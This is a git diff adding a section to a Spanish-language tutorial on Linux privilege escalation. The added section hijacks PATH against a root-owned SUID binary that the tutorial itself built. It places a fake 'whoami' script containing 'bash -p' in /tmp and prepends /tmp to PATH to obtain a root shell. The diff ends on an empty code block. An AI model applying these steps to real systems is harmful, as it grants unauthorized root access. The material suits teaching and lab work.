@@ -32,7 +32,7 @@ La explotación consciste en modificar el PATH, para que en lugar de ejecutar la
 
 Para este documentó se hará aprovechandose de un binario creado por root, y con persmisos SIUD.
 
-## Creando binario
+## Creando binario SUID (set user id)
 
 Crearemos nuestro propio binario que ejecutará un 'whoami' escrito en C. Llamado 'programa.c'
 
@@ -67,4 +67,31 @@ chmod 4755 binario
 Y debería verse de la siguiente forma usando ls -la
 ```
 -rwsrwxr-x. 1 root root 25224 Mar 30 18:11 binario
+```
+
+## Explotando vulnerabilidad - Path Hijacking & SUID
+
+A través del programa export, se pueden definir la variables del sistema. <br>
+Se utilizará export para modificar el PATH. <br>
+
+Pero antes de hacerlo, debemos crear un fichero que contenga el comando con el que escalaremos aprovechando SUID. <br>
+
+```
+cd /tmp
+touch whoami
+chmod 755 whoami
+```
+El contenido de whoami será el siguiente:
+```
+bash -p
+```
+De esa forma nos devolverá una shell con privilegios de root. <br>
+
+Ahora se modificaré el PATH: <br>
+```
+export PATH=/tmp:$PATH
+```
+El comienzo del path, se debería ver de la siguiente forma usando echo $PATH
+```
+
 ```
